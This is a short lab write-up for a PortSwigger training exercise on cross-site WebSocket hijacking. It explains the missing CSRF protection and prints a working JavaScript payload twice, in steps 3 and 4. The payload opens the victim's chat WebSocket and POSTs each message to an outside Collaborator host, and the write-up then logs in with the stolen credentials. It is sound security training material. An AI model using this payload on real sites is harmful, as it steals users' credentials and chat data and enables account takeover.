# Lab: Cross-site WebSocket hijacking (Practitioner)

**Lab:** [https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

**Task (from PortSwigger):**  
This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this to gain access to their account.

## Vulnerability
WebSocket handshake has no CSRF protection. Browser will attach the victim's session cookies to a cross-origin `wss://` connection opened from the attacker's page. Sending `READY` returns chat history (including credentials).

## Solution

1. Open Live chat, send a message, reload. In WebSockets history observe that `READY` returns past messages.
2. Copy the WebSocket URL from the handshake (`wss://YOUR-LAB-ID.web-security-academy.net/chat`).
3. On the exploit server host:

```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

4. View exploit yourself → Collaborator receives your chat history.
5. Deliver to victim → Collaborator receives victim's history containing username/password.
6. Log in with the stolen credentials → lab solved.

## Final Exploit Payload
```html
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```
